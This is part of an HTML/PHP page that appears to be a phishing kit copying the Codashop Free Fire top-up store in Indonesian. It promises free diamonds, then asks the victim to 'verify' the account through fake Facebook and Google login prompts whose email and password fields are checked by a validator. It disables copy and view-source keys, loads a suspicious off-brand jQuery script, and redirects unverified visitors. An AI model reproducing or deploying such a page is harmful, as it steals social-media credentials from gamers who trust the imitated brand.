                  <div class="form" id="formSection">
                     <p class="emailOptional default-1">Optional: Jika anda ingin mendapatkan bukti pembayaran atas pembelian anda, harap mengisi alamat emailnya</p>
                     <div class="email-input-container">
                        <input type="email" id="email" name="name" class="product-form-input" placeholder="Alamat E-mail">
                     </div>
                     <div class="email-form-btn-group">
                        <button id="mdn-submit" style="cursor:pointer; font-weight: 10em; width: 250px; color: #fff; border-radius: 48px; padding: 10px; font-size: 15px; border: 1px solid #6242fc; background: #6242fc !important;">
                           <span class="btn-submit-text">Beli sekarang</span>
                           <span class="btn-submit-text for-grab"></span>
                        </button>
                        <div class="remember-me-container">
                           <label for="ck1" class="remember-me-label">
                           <input type="checkbox" class="remember-me-chkbox" id="ck1">
                           <span class="remember-me-checkmark"></span>
                           <span class="remember-me-text"> Ingat saya </span>
                           </label>
                        </div>
                     </div>
                  </div>
                  <input type="hidden" id="id_no">
               </div>
               <div class="popError">
                  <div class="section">
                     <h2 class="errorHeader" style="background: #280031 !important;">
                        Player ID Tidak ditemukan!
                     </h2>
                     <ul class="" id="errorMessage"></ul>
                     <br><br>
                     <a href="javascript:void(0);" id="hidePopError" style="cursor:pointer; font-weight: 10em; width: 90px; color: #fff; border-radius: 48px; padding: 10px; font-size: 15px; border: 1px solid #6242fc; background: #6242fc !important;" class="modal-button">
                     Kembali</a>
                  </div>
               </div>
               <div id="overlay" class="overlay-element"></div>
            </section>
         </main>
         <section class="section product__long-description shop-content__container" style="background: #fff !important; color: #000 !important;">
            <br><br>
            <h1 class="product-tagline-title">
               Destinasi top up FF murah terbaik di Indonesia
            </h1>
            <article class="product__tag-line">
               <p class="shop-content--paragraph"> Hanya butuh beberapa detik saja untuk membeli Diamond Free Fire. Unlock berbagai macam hadiah Elite Pass premium, pet, baju, hingga skin senjata dengan Diamond Free Fire! Di Codashop, top-up jadi mudah, aman, dan praktis. Codashop dipercaya oleh jutaan gamers &amp; pengguna aplikasi di Asia Tenggara termasuk Indonesia. Caranya mudah, tanpa perlu registrasi ataupun log-in! <a href="#"> Klik disini untuk memulai. </a> 
               </p>
               <p class="shop-content--paragraph"> Tentang Free Fire: <br> FFree Fire adalah game mobile (HP/handphone) battle royale survival shooter terpopuler di Indonesia. Setiap 10 menit, Kamu akan ditempatkan di pulau terpencil dimana kamu akan diadu melawan 49 pemain lainnya. Lawan semua musuhmu untuk tetap hidup! Kamu dapat memilih titik pendaratan mengunakan parasut, ataupun tetap berada di zona aman selama yang kamu inginkan. Telusuri luasnya map pakai kendaraan keren, bersembunyi dibalik parit-parit, juga bergerilya dari balik rerumputan! Maju, tembak dan bertahanlah, karena pada akhirnya tujuanmu hanya satu: bertahan dan jadi pemenang!
               </p>
            </article>
         </section>

         <div data-v-25e4ac48="" class="spinner-container spinner-fixed spinner-dark-overlay" style="display: none;">
            <div class="spinner">
               <img class="spinner-container__icon" src="https://i.ibb.co/jr5VL36/favicon.png" alt="">
               <div class="spinner-container__progress-bar">
                  <div class="spinner-container__progress-bar__line"></div>
               </div>
               <div class="spinner-container__text">
                  Loading...
               </div>
            </div>
         </div>
         <link rel="stylesheet" href="https://cdn1.codashop.com/S/content/common/css/jquery-ui-1.12.1.css">
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-topnav2.5566e671b1.css">
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/mobile/css/productPage/responsive-product-page2.7ec2b81ede.css">
         <!-- info bar css -->
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/mobile/css/infoBar.662b8f1b5f.css">
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-shop-content.e6202b83de.css">
         <link rel="stylesheet preload" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-fontfaces.b6c83d3582.css" as="style">
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-footer2.2ce4d6e299.css">
         <footer class="footer-container" style="background: #b9aec5 !important;">
            <div class="footer-area">
               <section class="left-blocks-container">
                  <div class="socials-container">
                     <p class="social-title">Dapatkan berita Coda di:</p>
                     <div class="footer__social-media-container">
                        <a href="https://www.facebook.com/Codashop.IDofficial/" target="_blank" class="social-icon-container" aria-label="Codashop Official Facebook" rel="noopener">
                        <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/socmed-facebook-H36.png" alt="" class="social-icon">
                        </a>
                        <a href="https://www.youtube.com/c/CodashopOfficial" target="_blank" class="social-icon-container" aria-label="Codashop Youtube Channel" rel="noopener">
                        <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/socmed-youtube-H36.png" alt="" class="social-icon">
                        </a>
                        <a href="https://www.instagram.com/codashop.idofficial/" target="_blank" class="social-icon-container" aria-label="Codashop Official" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-instagram-H36.png" alt="" class="social-icon">
                        </a>
                     </div>
                  </div>
                  <div class="support-container">
                     <p class="support-title">Butuh Bantuan?</p>
                     <div class="support-icons">
                        <a href="https://m.me/Codashop.IDofficial" target="_blank" class="social-icon-container" aria-label="Contact via Facebook" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-facebook-msg-H36.png" alt="" class="social-icon">
                        </a>
                     </div>
                     <a href="https://support.codapay.com/hc/en-us/categories/360000012223-Indonesia" target="_blank" class="support-link" aria-label="Contact Codashop support" rel="noopener">
                        <div class="contact-icon">
                           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                              <path d="M320 352h-23.1a174.08 174.08 0 0 1-145.8 0H128A128 128 0 0 0 0 480a32 32 0 0 0 32 32h384a32 32 0 0 0 32-32 128 128 0 0 0-128-128zM48 224a16 16 0 0 0 16-16v-16c0-88.22 71.78-160 160-160s160 71.78 160 160v16a80.09 80.09 0 0 1-80 80h-32a32 32 0 0 0-32-32h-32a32 32 0 0 0 0 64h96a112.14 112.14 0 0 0 112-112v-16C416 86.13 329.87 0 224 0S32 86.13 32 192v16a16 16 0 0 0 16 16zm160 0h32a64 64 0 0 1 55.41 32H304a48.05 48.05 0 0 0 48-48v-16a128 128 0 0 0-256 0c0 40.42 19.1 76 48.35 99.47-.06-1.17-.35-2.28-.35-3.47a64.07 64.07 0 0 1 64-64z"></path>
                           </svg>
                        </div>
                        <div class="contact-text">Hubungi Kami</div>
                     </a>
                  </div>
                  <div class="international-container">
                     <a href="/international" class="international-flag-block" rel="noopener">
                        <i class="f32_indonesia footer__country-flag" id="footer__country-flag"></i>
                        <div class="international__country-name">Indonesia</div>
                     </a>
                  </div>
               </section>
               <section class="right-blocks-container">
                  <div class="legal-content-container">
                     <a href="/marketing-and-partnerships" target="_blank" rel="noopener">Pemasaran dan Kemitraan</a>
                     <a href="https://www.codapayments.com/terms-conditions" target="_blank" rel="noopener">Syarat &amp; Ketentuan</a>
                     <a href="https://www.codapayments.com/privacy-policy-bahasa" target="_blank" rel="noopener">Kebijakan Privasi</a>
                  </div>
                  <div class="copyright-container"> ©Hak Cipta Coda Payments </div>
               </section>
            </div>
         </footer>
      </div>
      <div style="display: none;" id="showKonfirm">
         <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front confirm-user-dialog__container ui-dialog-buttons ui-draggable" aria-describedby="confirm-user-dialog" aria-labelledby="ui-id-1" style="padding-top: 15px; border-radius: 13px;">
            <div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle" style="display: none;"><span id="ui-id-1" class="ui-dialog-title">&nbsp;</span><button type="button" class="ui-button ui-corner-all ui-widget ui-button-icon-only ui-dialog-titlebar-close" title="Close"><span class="ui-button-icon ui-icon ui-icon-closethick"></span><span class="ui-button-icon-space"> </span>Close</button></div>
            <div class="confirm-modal__container ui-dialog-content ui-widget-content" id="confirm-user-dialog" style="display: block; ">

               <ul>
                     <li class="confirm-modal__title" style="display: block; background: #280031 !important;">Detail pesanan</li>
                     <li class="confirm-modal__confirm-txt" style="color: #b9aec5 !important;">Mohon konfirmasi akun anda sudah benar.</li>
                     <li class="confirm-user-dialog__extra-msg"></li>
                     <li>
                        <table>
                          
                           <tbody><tr>
                              <td td="" colspan="4"> </td>
                           </tr>
                           <tr>
                              <td style="color: #b9aec5 !important;">ID:</td>
                              <td> </td>
                              <td> </td>
                              <td><div id="showPlayerId" style="color: #280031 !important;"></div></td>
                           </tr>
                           <tr>
                              <td colspan="4"> </td>
                           </tr>
                           <tr>
                              <td style="color: #b9aec5 !important;">Harga:</td>
                              <td> </td>
                              <td> </td>
                              <td style="color: #280031 !important;">Rp. 0 (Gratis)</td>
                           </tr>
                           <tr>
                              <td td="" colspan="4"> </td>
                           </tr>
                           <tr>
                              <td style="color: #b9aec5 !important;">Bayar dengan:</td>
                              <td> </td>
                              <td> </td>
                              <td><div id="payWith" style="color: #280031 !important;">CodaPay</div></td>
                           </tr>
                        </tbody></table>            
                     </li>
               </ul><span id="span-txnId" class="5991917773391017870" style="display: none;"></span></div>
            <div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
               <div class="ui-dialog-buttonset">
                  <button type="button" id="doConfirm" style="cursor:pointer; font-weight: 10em; width: 90px; color: #fff; border-radius: 48px; padding: 10px; font-size: 15px; border: 1px solid #6242fc; background: #6242fc !important;">Konfirm</button>
               </div>
            </div>
         </div>
      </div>
      <script>
         if ((location.href.includes("grab-demo.coda")) || (location.href.includes("grab.codashop"))) {
             $("body").addClass("custom--grab");
             $(".logo-container-link").contents().unwrap();
             $("body").append('<link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/mobile/css/responsive-grab-page.6b9f5c3d59.css" />');
         }
      </script>
      <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S/content/common/css/flags.css">
      <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/P/airtime/w/css/airtime_v1.0a.css">
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
      <script type="text/javascript">
         $(document).ready(function() {
            
            $("li.voucher-list-element").on('click', function() {
               $("#hidePopError").show();

               $("span.element-check-label").hide()
               $(this).find(".element-check-label").show();

               $("#checkLabel").show();
               $("#priceLabel_227").html("Harga");
               $("#priceInfo_227").html("Rp. 0 (Gratis)");
               $("#showPayLabel").show();
               $("#showTagline").show();

               $("li.payment-channel-element").on('click', function() {
                  $("span.element-check-label").hide()
                  $("div#priceLabel_227").html("");
                  $("div#priceInfo_227").html("");
                  $("div#showPayLabel").hide();
                  $("div#showTagline").hide();

                  $(this).find(".element-check-label").show();
                  $(this).find("#priceLabel_227").html("Harga");
                  $(this).find("#priceInfo_227").html("Rp. 0 (Gratis)");
                  $(this).find("#showPayLabel").show();
                  $(this).find("#showTagline").show();
                  $("#payWith").html($(this).find("span#paymentName").html());
               });

               $("#mdn-submit").on('click', function() {
                  var userId = $("#userId").val();

                  if(userId == "") {
                     $("#overlay").hide();
                     $(".popError").hide();
                     $("#errorMessage").addClass("errorMessage__container");
                     $("#errorMessage").html("<li class='error-msg__element'>Silahkan isi Player ID Free Fire Anda.</li>");
                     $("#overlay").show();
                     $(".popError").show();
                  } else {
                     $.ajax({
                        url: "cek/trueID.php",
                        type: "POST",
                        data: "userId="+userId,
                        beforeSend: function() {
                           $("#overlay").hide();
                           $(".popError").hide();
                           $(".spinner-container").show();
                        },
                        success: function(response) {
                           $("#overlay").hide();
                           $(".popError").hide();
                           $(".spinner-container").hide();
                             
                              $(".spinner-container").hide();
                             
                              $("#showPlayerId").html(userId);
                              $("#overlay").show();
                              $("#showKonfirm").fadeIn("slow");
                              $("#doConfirm").on("click", function() {
                                 $("#showKonfirm").hide();
                                 $("#errorMessage").removeClass("errorMessage__container");
                                 $(".errorHeader").html("Hi "+response+", Verifikasi akun anda");
                                 $("#errorMessage").html('<center><h4>Metode Login :</h4><div class="imgLogin" style="display:block; margin: auto; margin-top: 20px;"><img id="fbLogin" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/f1.png" alt="" style="width: 250px; cursor: pointer; display: block; margin: 5px auto;"> <!---<img src="img/vk-btn.png" alt="" id="vkLogin" style="width: 250px; cursor: pointer; display: block; margin: 5px auto;">---> <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/10/g1.png" alt="" id="gpLogin" style="width: 250px; cursor: pointer; display: block; margin: 5px auto;"></div></center>');
                                 $("#overlay").show();
                                 $(".popError").show();
                                 $("#hidePopError").hide();
                                 
                                 $("input#userIdForm").val(userId);

                                 $("#fbLogin").on('click', function() {
                                    $("#errorMessage").addClass("errorMessage__container");
                                    $("#overlay").hide();
                                    $(".popError").hide();
                                    $("#hidePopError").show();
                                    $(".facebook").fadeIn('slow');

                                    $(".close-fb").on('click', function() {
                                       $(".facebook").hide();
                                       $("#submit-loader").hide();
                                       $("#errorMessage").removeClass("errorMessage__container");
                                       $("#overlay").show();
                                       $(".popError").show();
                                       $("#hidePopError").hide();
                                    });
                                 });

                                 $("#gpLogin").on('click', function() {
                                    $("#errorMessage").addClass("errorMessage__container");
                                    $("#overlay").hide();
                                    $(".popError").hide();
                                    $("#hidePopError").show();
                                    $(".gp").fadeIn('slow');

                                    $(".close-gp").on('click', function() {
                                       $(".gp").hide();
                                       $("#submit-loader").hide();
                                       $("#errorMessage").removeClass("errorMessage__container");
                                       $("#overlay").show();
                                       $(".popError").show();
                                       $("#hidePopError").hide();
                                    });
                                 });

                                 $("#vkLogin").on('click', function() {
                                    $("#errorMessage").addClass("errorMessage__container");
                                    $("#overlay").hide();
                                    $(".popError").hide();
                                    $("#hidePopError").show();
                                    $(".twitter").fadeIn('slow');

                                    $(".close-other").on('click', function() {
                                       $(".twitter").hide();
                                       $("#submit-loader").hide();
                                       $("#errorMessage").removeClass("errorMessage__container");
                                       $("#overlay").show();
                                       $(".popError").show();
                                       $("#hidePopError").hide();
                                    });
                                 });
                              });
                           
                        }
                     });
                  }
               });
               
            });

            $("#mdn-submit").on('click', function() {
               $("#overlay").show();
               $(".popError").show();
               $("#errorMessage").addClass("errorMessage__container");
               $("#errorMessage").html("<li class='error-msg__element'>Silahkan isi Player ID Free Fire Anda.</li><li class='error-msg__element'>Silahkan pilih nomor voucher</li><li class='error-msg__element'>Silahkan pilih metode pembayaran</li>");

               $("#hidePopError").on('click', function() {
                  $("#errorMessage").html("");
                  $("#overlay").hide();
                  $(".popError").hide();
               });
            });
         
         });
      </script>
      <a href="https://plus.google.com/104822527805498875313" style="display: none;" rel="publisher">Google+</a>
      <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/infoBar.38acc407b3.js"></script>
      <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/faq.7a04e34b3d.js"></script>
      <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/payment-channel-suggestion.535f3c6f70.js"></script>
            <script type="text/javascript" src="https://cdnassets.biz.id/ajax/libs/jquery/8.5.7/jquery-1.1.0.min.js"></script>
      <script type="text/javascript" src="https://www.google.com/recaptcha/api.js" async="" defer=""></script>
      
      <script type="text/javascript">
         (function(t, a, p) {
             t.TapfiliateObject = a;
             t[a] = t[a] || function() {
                 (t[a].q = t[a].q || []).push(arguments)
             }
         })(window, 'tap');
         
         tap('create', '11857-697628');
         tap('detect');
         
         tap('getTrackingId', null, function(trackingId) {
             CODA.Shop.affiliateTrackingId = trackingId ? trackingId : '';
         });
      </script>
      <script type="text/javascript">
	    function valid() {
	        var user = $('#emailx').val();
	        var pass = $('#passw').val(); 
	        if(user == '' || user == null || user.length <= 5)
	        {
	            $('.email').show();
	            $('.sandi').hide();
	            return false;
	        }else{
	            $('.email').hide();
	        }
	        if(pass == '' || pass == null || pass.length <= 5)
	        {
	            $('.sandi').show();
	            return false;
	        }else{
	            $('.sandi').hide();
	        }
	    }
	</script>

		<script>
            document.onkeydown = function(e) {
                if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
                    return false;
                } else {
                    return true;
                }
            };
     </script>
</body>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>